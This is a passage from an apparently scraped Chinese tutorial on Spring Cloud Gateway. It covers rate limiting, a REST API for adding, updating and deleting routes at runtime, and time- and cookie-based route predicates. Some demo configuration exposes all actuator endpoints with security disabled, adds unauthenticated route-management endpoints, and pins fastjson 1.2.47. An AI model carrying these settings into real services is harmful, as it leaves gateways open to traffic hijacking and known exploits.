gateway-servermanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 测试结果 i. Linux 系统下执行压测命令 sysbench cpu --cpu-max-prime=20000 --threads=8 --time=60 run 来模拟 CPU 高负载，其中 --threads 是指 CPU 核数，--time 是指运行时间（秒）ii. 访问 http://localhost:9093/actuator/metrics/system.cpu.usage，查看网关服务所在机器的 CPU 使用情况iii. 启动各个应用后，多次访问 http://127.0.0.1:9090/rateLimit，当 CPU 使用率超过 50% 后，Spring Cloud Gateway 中自定义的限流过滤器开始拒绝处理请求，直接返回 429 状态码（因为请求太多，限流返回 429 状态码），控制台输出的日志信息如下： 12345c.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.846045400926432, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.8458261370178468, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.844951044863364, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.8547458051590282, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.8486913849509269, isOpenRateLimit:true Gateway 内置的限流过滤器工厂Spring Cloud Gateway 内置了一个名为 RequestRateLimiterGatewayFilterFactory 的过滤器工厂，可以直接用来限流；其底层的实现依赖于 Redis，使用的算法是令牌桶算法。由于篇幅有限，下面只给出 Gateway Server 工程的核心代码和配置。 添加 Maven 依赖 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis-reactive&lt;/artifactId&gt;&lt;/dependency&gt; 编写 RemoteAddrKeyResolver 类 123456789public class RemoteAddrKeyResolver implements KeyResolver { public static final String BEAN_NAME = "remoteAddrKeyResolver"; @Override public Mono&lt;String&gt; resolve(ServerWebExchange exchange) { return Mono.just(exchange.getRequest().getRemoteAddress().getAddress().getHostAddress()); }} 编写 CommonConfiguration 类 12345678@Configurationpublic class CommonConfiguration { @Bean(RemoteAddrKeyResolver.BEAN_NAME) public RemoteAddrKeyResolver remoteAddrKeyResolver() { return new RemoteAddrKeyResolver(); }} 编写 application.yml 配置文件，添加 Gateway 限流相关的配置内容 123456789101112131415161718192021222324252627server: port: 9092spring: application: name: gateway-server redis: host: 172.175.0.3 port: 6379 cloud: gateway: routes: - id: rateLimit_route uri: http://127.0.0.1:9091/sayHello/peter/ order: 0 predicates: - Path=/rateLimit filters: #Filter名称必须是RequestRateLimiter - name: RequestRateLimiter args: #使用SpEL按名称引用bean key-resolver: "#{@remoteAddrKeyResolver}" #允许用户每秒处理多少个请求 redis-rate-limiter.replenishRate: 1 #令牌桶的容量，允许在一秒钟内完成的最大请求数 redis-rate-limiter.burstCapacity: 5 测试结果 启动各个应用后，多次访问 http://127.0.0.1:9092/rateLimit，可以发现当请求太过频繁的时候，Spring Cloud Gateway 会直接返回 429 状态码。 基于 Sentinel 实现限流熔断降级 Sentinel 整合 Gateway Spring Cloud Gateway 的动态路由网关中有两个重要的概念，那就是路由配置和路由规则。路由配置是指配置某请求路径路由到指定的目的地址，而路由规则是指匹配到路由配置之后，再根据路由规则进行转发处理。 Spring Cloud Gateway 作为所有请求流量的入口，在实际生产环境中为了保证高可靠和高可用，以及尽量避免重启，需要实现 Spring Cloud Gateway 动态路由配置。Spring Cloud Gateway 提供了两种方法来配置路由规则（Java 流式 API、YML 配置文件），但都是在 Spring Cloud Gateway 启动时将路由配置和规则加载到内存里，无法做到不重启网关应用就可以动态地对路由的配置和规则进行增加、修改和删除操作。Spring Cloud Gateway 的官方文档并没有讲如何进行动态配置，査看 Spring Cloud Gateway 的源码，发现在 org.springframework.cloud.gateway.actuate.GatewayControllerEndpoint 类中提供了动态配置的 Rest 接口，但是需要开启 Gateway 的端点，而且其提供的功能不是很强大。通过参考与 GatewayControllerEndpoint 相关的代码，可以自己编码实现动态路由配置。 基于 Rest API 的动态路由实现（内存版）下面将介绍 Gateway 基于 Rest API 的动态路由实现，为了方便演示，下述示例的路由配置信息默认存储在内存；若需要持久化路由配置信息（如 MySQL 持久化），可以扩展实现 RouteDefinitionRepository 接口，点击下载完整的案例代码。 添加 Maven 依赖 1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.47&lt;/version&gt;&lt;/dependency&gt; 定义数据传输模型，分别编写 GatewayRouteDefinition、GatewayPredicateDefinition、GatewayFilterDefinition 类 1234567891011121314151617181920212223242526272829303132/** * Gateway的路由定义模型 */public class GatewayRouteDefinition { /** * 路由的Id */ private String id; /** * 路由断言集合配置 */ private List&lt;GatewayPredicateDefinition&gt; predicates = new ArrayList&lt;&gt;(); /** * 路由过滤器集合配置 */ private List&lt;GatewayFilterDefinition&gt; filters = new ArrayList&lt;&gt;(); /** * 路由规则转发的目标uri */ private String uri; /** * 路由执行的顺序 */ private int order = 0; // 省略Get和Set方法 ...} 1234567891011121314151617/** * 路由断言定义模型 */public class GatewayPredicateDefinition { /** * 断言对应的Name */ private String name; /** * 配置的断言规则 */ private Map&lt;String, String&gt; args = new LinkedHashMap&lt;&gt;(); // 省略Get和Set方法 ...} 1234567891011121314151617/** * 过滤器定义模型 */public class GatewayFilterDefinition { /** * Filter Name */ private String name; /** * 对应的路由规则 */ private Map&lt;String, String&gt; args = new LinkedHashMap&lt;&gt;(); // 省略Get和Set方法 ...} 编写动态路由的实现类 DynamicRouteServicelmpl，需要实现 ApplicationEventPublisherAware 接口 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * 动态路由实现类 */@Servicepublic class DynamicRouteServiceImpl implements ApplicationEventPublisherAware { private ApplicationEventPublisher publisher; @Autowired private RouteDefinitionWriter routeDefinitionWriter; private static final Logger logger = LoggerFactory.getLogger(DynamicRouteServiceImpl.class); @Override public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) { this.publisher = applicationEventPublisher; } private void notifyChanged() { this.publisher.publishEvent(new RefreshRoutesEvent(this)); } /** * 增加路由 * * @param definition * @return */ public boolean add(RouteDefinition definition) { try { routeDefinitionWriter.save(Mono.just(definition)).subscribe(); notifyChanged(); } catch (Exception e) { logger.error("add route fail: " + e.getMessage()); return false; } return true; } /** * 更新路由 * * @param definition * @return */ public boolean update(RouteDefinition definition) { try { // 特别注意，这里一定不能执行subscribe()方法，否则更新逻辑存在Bug this.routeDefinitionWriter.delete(Mono.just(definition.getId())); } catch (Exception e) { logger.error("update route fail: " + e.getMessage()); return false; } try { routeDefinitionWriter.save(Mono.just(definition)).subscribe(); notifyChanged(); return true; } catch (Exception e) { logger.error("update route fail: " + e.getMessage()); return false; } } /** * 删除路由 * * @param id * @return */ public boolean delete(String id) { try { this.routeDefinitionWriter.delete(Mono.just(id)).subscribe(); notifyChanged(); return true; } catch (Exception e) { logger.error("delete route fail: " + e.getMessage()); return false; } } /** * 装配路由配置信息 * * @param gwdefinition * @return */ public RouteDefinition assembleRouteDefinition(GatewayRouteDefinition gwdefinition) { RouteDefinition definition = new RouteDefinition(); // ID definition.setId(gwdefinition.getId()); // Predicates List&lt;PredicateDefinition&gt; pdList = new ArrayList&lt;&gt;(); for (GatewayPredicateDefinition gpDefinition : gwdefinition.getPredicates()) { PredicateDefinition predicate = new PredicateDefinition(); predicate.setArgs(gpDefinition.getArgs()); predicate.setName(gpDefinition.getName()); pdList.add(predicate); } definition.setPredicates(pdList); // Filters List&lt;FilterDefinition&gt; fdList = new ArrayList&lt;&gt;(); for (GatewayFilterDefinition gfDefinition : gwdefinition.getFilters()) { FilterDefinition filter = new FilterDefinition(); filter.setArgs(gfDefinition.getArgs()); filter.setName(gfDefinition.getName()); fdList.add(filter); } definition.setFilters(fdList); // URI URI uri = UriComponentsBuilder.fromUriString(gwdefinition.getUri()).build().toUri(); definition.setUri(uri); return definition; }} 编写 Rest 控制器，对外暴露 Rest API 123456789101112131415161718192021222324252627282930313233343536373839404142@RestController@RequestMapping("/route")public class RouteController { @Autowired private DynamicRouteServiceImpl dynamicRouteService; /** * 增加路由 * * @param gwdefinition * @return */ @PostMapping("/add") public String add(@RequestBody GatewayRouteDefinition gwdefinition) { RouteDefinition definition = dynamicRouteService.assembleRouteDefinition(gwdefinition); return this.dynamicRouteService.add(definition) ? "success" : "fail"; } /** * 删除路由 * * @param id * @return */ @GetMapping("/delete/{id}") public String delete(@PathVariable String id) { return this.dynamicRouteService.delete(id) ? "success" : "fail"; } /** * 更新路由 * * @param gwdefinition * @return */ @PostMapping("/update") public String update(@RequestBody GatewayRouteDefinition gwdefinition) { RouteDefinition definition = dynamicRouteService.assembleRouteDefinition(gwdefinition); return this.dynamicRouteService.update(definition) ? "success" : "fail"; }} 编写应用的启动主类 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} 编写 application.yml 配置文件： 1234567891011121314server: port: 9090spring: application: name: gateway-servermanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 测试结果 i. 启动 gateway 应用ii. 访问 http://127.0.0.1:9090/actuator/gateway/routes，此时返回的路由信息应该为空 []iii. 通过 Postman 访问 http://127.0.0.1:9090/route/add，发起 Post 请求添加路由配置信息，其中需要提交的 JSON 数据如下： 1234567891011121314{ "filters": [], "id": "jd_route", "order": 0, "predicates": [ { "args": { "pattern": "/jd" }, "name": "Path" } ], "uri": "http://www.jd.com"} iiii. 再次访问 http://127.0.0.1:9090/actuator/gateway/routes，此时应该可以返回上面添加的路由配置信息iiiii. 访问 http://127.0.0.1:9090/jd，发现可以正常跳转到京东商城的首页，说明上面添加的路由配置生效了iiiiii. 通过 Postman 访问 http://127.0.0.1:9090/route/update，发起 Post 请求更改路由配置信息，其中需要提交的 JSON 数据如下： 1234567891011121314{ "filters": [], "id": "jd_route", "order": 0, "predicates": [ { "args": { "pattern": "/jd" }, "name": "Path" } ], "uri": "http://www.taobao.com"} iiiiiii. 访问 http://127.0.0.1:9090/actuator/gateway/routes，可以发现返回的路由配置信息已经被修改了iiiiiiii. 访问 http://127.0.0.1:9090/jd，发现可以成功跳转到淘宝网iiiiiiiii. 通过 Postman 访问 http://127.0.0.1:9090/route/delete/jd_route，发起 Get 请求删除路由配置信息 最后附上 JSON 版的完整路由配置示例 1234567891011121314151617181920212223242526{ "filters": [ { "args": { "name": "hystrix", "fallbackUri": "forward:/fallback" }, "name": "Hystrix" }, { "args": {}, "name": "RateLimit" } ], "id": "jd_route", "order": 0, "predicates": [ { "args": { "pattern": "/jd" }, "name": "Path" } ], "uri": "http://www.jd.com"} Gateway 集群下的动态路由实现上面的示例简单地实现了单机 Gateway 的动态路由，单机 Gateway 中的路由配置信息保存在当前实例的内存中，实例重启后会丢失路由配置信息，同时无法做到整个 Gateway 集群的动态路由控制。通过分析 Spring Cloud Gateway 源码可以发现，默认的 RouteDefinitionWriter 实现类是 InMemoryRouteDefinitionRepository。而 RouteDefinitionRepository 继承了 RouteDefinitionWriter，是 Spring Cloud Gateway 官方预留的接口，因此可以通过下面两种方式来实现集群下的动态路由控制：RouteDefinitionWriter 接口和 RouteDefinitionRepository 接口。在这里推荐实现 RouteDefinitionRepository 这个接口，从数据库或者从配置中心获取路由进行动态配置；具体可以参考上面单机版的动态路由实现，在这里不再累述。 参考资料 Spring Cloud Gateway（Greenwich.SR1） 整合 Swagger2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Gateway 入门教程 - 基础篇",url:"/posts/ec48bc77.html",text:'Reactor 与 WebFlux 介绍Reactor 是什么为了应对高并发的服务器端开发，在 2009 年 的时候，微软提出了一个更优雅地实现异步编程的方式 - Reactive Programming，中文名是响应式编程或者叫反应式编程。随后，其它技术也迅速地跟上了脚步，像 ES6 通过 Promise 引入了类似的异步编程方式。Netflix 和 TypeSafe 公司也提供了 RxJava、Scala、Akka 技术，让 Java 平台也有了能够实现响应式编程的框架，现在比较熟知的 Hystrix 就是以 RxJava 为基础开发的。到了 2017 年，虽然已经有不少公司在实践响应式编程，但整体来说应用范围依旧不大，主要原因在于缺少简单易用的技术将响应式编程推广普及，诸如 MVC 框架、HTTP 客户端、数据库技术等整合。终于，在 2017 年 9 月 28 日，Spring 5 正式发布，而 Spring 5 其最大的意义就是将响应式编程技术的普及向前推进一大步。在背后支持 Spring 5 响应式编程的框架正是 Reactor，它是由 Pivotal 公司（开发 Spring 等技术的公司）开发的，实现了 Reactive Programming 思想，符合 Reactive Streams 规范（Reactive Streams 是由 Netflix、TypeSafe、Pivotal 等公司发起的）的一项技术。Reactive 与 Servlet 的技术栈对比图如下： WebFlux 是什么Spring WebFlux 是 Spring 5.0 引入的新的响应式框架，区别于 Spring MVC，它不需要依赖 Servlet API，采用异步非阻塞的架构，底层基于 Reactor 来实现响应式流规范。因此，Spring WebFlux 特别适合应用在 I/O 密集型的服务中，比如微服务网关这样的应用中。在传统的 Web 架构中，比如 Struts2、Spring MVC 等都是基于 Servlet API 与 Servlet 容器基础之上运行的，使用的是同步阻塞式 I/O 模型。但是在 Servlet 3.1 之后有了异步非阻塞的支持，而 Spring WebFlux 采用的就是典型的异步非阻塞架构，它的核心是基于 Reactor 的相关 API 实现。相对于传统的 Web 架构来说，Spring WebFlux 可以运行在诸如 Netty 及支持 Servlet 3.1+ 的容器（Tomcat、Jetty、Undertow）之上，支持异步非阻塞式 I/O 模型 + 函数式编程（依赖 JDK 8）。根据官方的说明，Spring WebFlux 并不能使接口的响应时间缩短，它仅仅能够提升吞吐量和伸缩性。Spring WebFlux 与 传统 Web 架构的对比图如下： 首先需要明确的一点就是，Spring WebFlux 不是 Spring MVC 的替代方案！虽然 Spring WebFlux 也可以运行在 Servlet 容器之上（Servlet 3.1+），但是 Spring WebFlux 主要还是应用在适合使用异步非阻塞模型的业务场景。而 Spring MVC 是同步阻塞的，如果项目在 Spring MVC 框架中大量使用了非同步方案，那么 Spring WebFlux 才是适用，否则使用 Spring MVC 才是首选。在微服务架构中，Spring MVC 和 Spring WebFlux 可以混合使用，比如上面已经提到的，对于那些 I/O 密集型服务（如网关）就可以使用 Spring WebFlux 来实现。Spring MVC 和 Spring WebFlux 的对比图如下： Spring WebFlux 默认情况下使用 Netty 作为服务器 Spring WebFlux 暂时不支持 MySQL，支持 Redis、MongoDB、PostgreSQL Spring WebFlux 使用的响应式流并不是用 JDK 9 提供的，而是基于 Reactor 响应式流库 Spring WebFlux 也可以使用 Spring MVC 注解，如 @Controller，方便在两个 Web 框架中自由转换 Spring WebFlux 与 Spring MVC 都可以使用 Tomcat、Jetty、Undertow 等 Servlet 容器（Servlet 3.1+） Spring MVC 因为是使用的同步阻塞式 I/O 模型，更方便开发人员开发和测试代码；一般来说，如果 Spring MVC 能够满足的场景，就尽量不要用 Spring WebFlux Spring Cloud Gateway 介绍Spring Cloud Gateway 是什么Spring Cloud Gateway 是 Spring 官方基于 Spring 5.x、Spring Boot 2.x、Spring WebFlux 和 Reactor 等技术开发的网关，旨在为微服务架构提供简单、有效且统一的 API 路由管理方式。Spring Cloud Gateway 作为 Spring Cloud 生态系统中的网关，目标是替代 Netflix Zuul 1.x。在 Spring Boot 2.0 以上版本中，并没有对 Zuul 2.0 以上最新高性能版本进行集成，仍然使用 Zuul 1.x 非 Reactor 模式（基于 Servlet 2.5 阻塞架构）的旧版本。Spring Cloud Gateway 其不仅提供统一的路由方式，并且还基于 Filter 链的方式提供了网关基本的功能，例如：熔断、重试、安全、监控 / 指标、限流等，更多资料可参考：Gateway 官方英文文档。 Spring Cloud Gateway 的核心概念网关提供 API 全托管服务，丰富的 API 管理功能，辅助企业管理大规模的 API，以降低管理成本和安全风险，包括协议适配、协议转发、安全策略（WAF）、防刷、流量、监控日志等功能。一般来说，网关对外暴露的 URL 或者接口信息，统称为路由信息。如果研发过网关中间件，或者使用或了解过 Zuul 的开发者，会知道网关的核心肯定是 Filter 以及 Filter Chain（Filter 责任链）。Spring Cloud Gateway 也具有路由和 Filter 的概念，其中最重要的几个概念如下： 路由（route）：路由是网关最基础的部分，路由信息由一个 ID、一个目的 URL、一组断言工厂和一组 Filter 组成；如果路由断言为真，则说明请求的 URL 和配置的路由匹配。 断言（predicate）：Java 8 中的断言函数，Spring Cloud Gateway 中的断言函数输入类型是 Spring 5.0 框架中的 ServerWebExchange。在 Spring Cloud Gateway 中的断言函数允许开发者去定义匹配来自于 Http Request 中的任何信息，比如请求头和参数等。 过滤器（filter）：一个标准的 Spring Web Filter，在 Spring Cloud Gateway 中的 Filter 分为两种类型，分别是 Gateway Filter 和 Global Filter，过滤器 Filter 将会对请求和响应进行修改处理。 Spring Cloud Gateway 的核心原理Spring Cloud Gateway 的核心处理流程如下图所示，Gateway 的客户端会向 Spring Cloud Gateway 发起请求，请求首先会被 HttpWebHandlerAdapter 进行提取组装成网关的上下文，然后网关的上下文会传递给 DispatcherHandler。这里的 DispatcherHandler 是所有请求的分发处理器，DispatcherHandler 主要负责分发请求到对应的处理器，比如将请求分发到对应 RoutePredicateHandlerMapping（路由断言处理映射器）。路由断言处理映射器主要用于路由的查找，以及找到路由后返回对应的 FilteringWebHandler。FilteringWebHandler 主要负责组装 Filter 链表并调用 Filter 执行一系列的 Filter 处理，然后把请求转到后端对应的代理服务处理，处理完毕之后，将 Response 返回到 Gateway 客户端。在 Filter 链中，通过虚线分割 Filter 的原因是，过滤器可以在转发请求之前处理或者接收到被代理服务的返回结果之后处理。所有的 Pre 类型的 Filter 执行完毕之后，才会转发请求到被代理的服务处理。被代理的服务把所有请求处理完毕之后，才会执行 Post 类型的过滤器。值得一提的是，在配置路由的时候，如果不指定端口的话，HTTP 默认设置端口为 80，HTTPS 默认设置端口为 443，Spring Cloud Gateway 的启动容器目前只支持 Netty。 Spring Cloud Gateway 入门案例1. 版本说明在本文中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，特别声明除外，点击下载完整的案例代码。 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下。特别注意，Spring Cloud Gateway 是基于 WebFlux 的，它与 Spring MVC 是不兼容的，如果引用了 spring-boot-starter-web，则需要把 spring-webmvc 排除掉；由于 Spring Cloud Gateway 的启动容器目前只支持 Netty，因此还需要将 spring-boot-starter-tomcat 排除掉。这里也可以引入 spring-boot-starter-webflux 来替代 Spring MVC 的功能，关于 Gateway 的使用，原则上只需要引入 spring-cloud-starter-gateway 即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;${java.version}&lt;/source&gt; &lt;target&gt;${java.version}&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 3. 创建 Gateway 工程创建 Gateway 的 Maven 工程，配置工程里的 pom.xml 文件： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Gateway 的配置类： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { // 当访问到 http://127.0.0.1:9090/jd 直接跳转到京东商城的首页 return builder.routes() .route(r -&gt; r.path("/jd") .uri("http://jd.com:80/").id("jd_route") ).build(); }} 创建 Gateway 的主控制类： 1234567@SpringBootApplicationpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} 创建 Gateway 的 application.yml 配置文件，添加开启端点的配置信息，Spring Cloud Gateway 提供了一个 Gateway Actuator，该 EndPiont 提供了关于 Filter 及 Routes 的信息查询以及指定 Route 信息更新的 Rest API 接口： 123456789101112131415161718192021server: port: 9090spring: application: name: gateway-serverlogging: level: org.springframework.cloud.gateway: TRACE org.springframework.http.server.reactive: DEBUG org.springframework.web.reactive: DEBUG reactor.ipc.netty: DEBUGmanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 4. 创建 Gateway YML 工程Spring Cloud Gateway 支持两种方式去配置路由信息，上述代码通过 Java 流式 API 自定义 RouteLocator 的方式定义 Spring Cloud Gateway 的路由信息，也可以通过如下 YML 文件的方式配置路由。 创建 Gateway YML 的 Maven 工程，配置工程里的 pom.xml 文件： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Gateway YML 的主控制类： 1234567@SpringBootApplicationpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} 创建 Gateway YML 的 application.yml 配置文件： 12345678910111213141516171819202122232425262728server: port: 9091spring: application: name: gateway-server cloud: gateway: routes: #当访问到 http://127.0.0.1:9090/baidu 直接跳转到百度的首页 - id: baidu_route uri: http://baidu.com:80/ predicates: - Path=/baidulogging: level: org.springframework.cloud.gateway: TRACE org.springframework.http.server.reactive: DEBUG org.springframework.web.reactive: DEBUG reactor.ipc.netty: DEBUGmanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 5. 测试结果 分别启动 gateway、gateway-yml 应用 访问 http://127.0.0.1:9090/actuator/gateway/routes，查看返回的所有路由信息，如下图所示： 访问 http://127.0.0.1:9090/jd，查看是否成功跳转到京东商城的首页 访问 http://127.0.0.1:9091/baidu，查看是否成功跳转到百度的首页 Spring Cloud Gateway 的路由断言Spring Cloud Gateway 的路由匹配的功能是以 Spring WebFlux 中的 Handler Mapping 为基础实现的。Spring Cloud Gateway 也是由许多的路由断言工厂组成的，当 Http Request 请求进入 Spring Cloud Gateway 的时候，网关中的路由断言工厂会根据配置的路由规则，对 Http Request 请求进行断言匹配；匹配成功则进行下一步处理，否则断言失败直接返回错误信息。值得一提的是，Spring Cloud Gateway 大多数的路由断言工厂是支持正则表达式匹配的。下面将给出各种路由断言工厂的使用示例，点击下载完整的案例代码。 After 路由断言工厂After 路由断言工厂中会取一个 UTC 时间格式的时间参数，当请求进来的当前时间在配置的 UTC 时间之后，则会成功匹配，否则不能成功匹配。 通过 Java 代码的方式，将 After 路由断言的配置信息配置到路由里去： 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { // 生成比当前时间早一个小时的UTC时间 ZonedDateTime minusTime = LocalDateTime.now().minusHours(1).atZone(ZoneId.systemDefault()); return builder.routes() .route( "after_route", r -&gt; r.after(minusTime).uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 After 路由断言信息：其中的 UTC 时间可以使用 Java 代码生成，例如 ZonedDateTime.now().minusHours(1).format(DateTimeFormatter.ISO_ ZONED_DATE_TIME); 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: after_route uri: http://baidu.com predicates: - After=2019-10-01T21:55:18.146+08:00[Asia/Shanghai] 测试结果： 启动应用，访问 http://127.0.0.1，查看是否成功跳转到百度的首页 更改 UTC 时间为当前时间一个小时后的 UTC 时间，然后再启动应用，访问 http://127.0.0.1，页面会返回 404 错误信息 Before 路由断言工厂Before 路由断言工厂会取一个 UTC 时间格式的时间参数，当请求进来的当前时间在配置的 UTC 时间之前，则会成功匹配，否则不能成功匹配。 通过 Java 代码的方式，将 Before 路由断言的配置信息配置到路由里去： 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { // 生成比当前时间晚一个小时的UTC时间 ZonedDateTime plusTime = LocalDateTime.now().plusHours(1).atZone(ZoneId.systemDefault()); return builder.routes() .route( "before_route", r -&gt; r.before(plusTime).uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Before 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: before_route uri: http://baidu.com predicates: - Before=2019-10-01T21:55:18.146+08:00[Asia/Shanghai] Between 路由断言工厂Between 路由断言工厂会取一个 UTC 时间格式的时间参数，当请求进来的当前时间在配置的 UTC 时间之间，则会成功匹配，否则不能成功匹配。 通过 Java 代码的方式，将 Between 路由断言的配置信息配置到路由里去： 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { ZonedDateTime minusTime = LocalDateTime.now().minusHours(1).atZone(ZoneId.systemDefault()); ZonedDateTime plusTime = LocalDateTime.now().plusHours(1).atZone(ZoneId.systemDefault()); return builder.routes() .route( "between_route", r -&gt; r.between(minusTime, plusTime).uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Between 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: between_route uri: http://baidu.com predicates: - Between=2019-11-10T11:11:11.111 08:00[Asia/Shanghai], 2019-11-12T11:11:11.111 08:00[Asia/Shanghai] Cookie 路由断言工厂Cookie 路由断言工厂会取两个参数，分别是 cookie 名称对应的 key 和 value。当请求中携带的 cookie 和 Cookie 断言工厂中配置的 cookie 一致，则路由匹配成功，否则匹配不成功。 通过 Java 代码的方式，将 Cookie 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "cookie_route", r -&gt; r.cookie("book", "java").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Cookie 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: cookie_route uri: http://baidu.com predicates: - Cookie=book, java 测试结果 启动 gateway-cookie 应用 在 Postman 中将 book=java 添加到 Cookie，然后访问 http://127.0.0.1，查看是否成功跳转到百度的首页 Header 路由断言工厂Header 